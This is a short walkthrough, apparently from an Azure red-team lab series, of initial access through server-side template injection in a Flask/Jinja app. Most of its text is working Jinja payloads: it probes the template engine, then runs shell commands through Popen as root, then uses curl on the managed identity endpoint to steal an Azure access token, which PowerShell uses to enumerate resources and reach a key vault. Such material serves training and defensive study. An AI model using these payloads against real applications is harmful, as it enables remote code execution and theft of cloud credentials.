# Initial Access - SSTI
## Initial Access via Compromised App Service Abuse with SSTI
***Part of - Kill Chain - 2***

<!---objective 11 -->
 ![test](/img/ssti.png "Initial Access via App Service Abuse")
 
In this application `Flask` is used as a framework. Flask is uses Jinja as a template engine

```java
{{7*7}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

**To find the right index of Popen, we can loop through all the classes and call the correct one. Use the following code, that runs the 'whoami' command using Popen:**

 ![test](/img/ssti_1.png "Initial Access via App Service Abuse")

```python
{% for x in ().__class__.__mro__[1].__subclasses__() %}
 {% if "Popen" in x.__name__ %}
 {{x('whoami',shell=True,stdout=-1).communicate()}}
 {% endif %}
{% endfor %}
```
We have root on the container/instance of the app service. Now, let's check the environment â€“ by using env command - to now if any managed identity is assigned to this app service. Recall that we need to check `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` variables:

**Let's request the access token for the managed identity now using the following code:**
![test](/img/ssti_2.png "Initial Access via App Service Abuse")
![test](/img/ssti_3.png "Initial Access via App Service Abuse")
 
```python
{% for x in ().__class__.__mro__[1].__subclasses__() %}
  {% if "Popen" in x.__name__ %}
    {{x('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=-1).communicate()}}
  {% endif %}
{% endfor %}
```

```powershell
Connect-AzAccount -AccessToken $token 0AccountId $client_id
Get-AzResource
```

**Managed identity can access a key vault.**
![test](/img/ssti_4.png "Initial Access via App Service Abuse")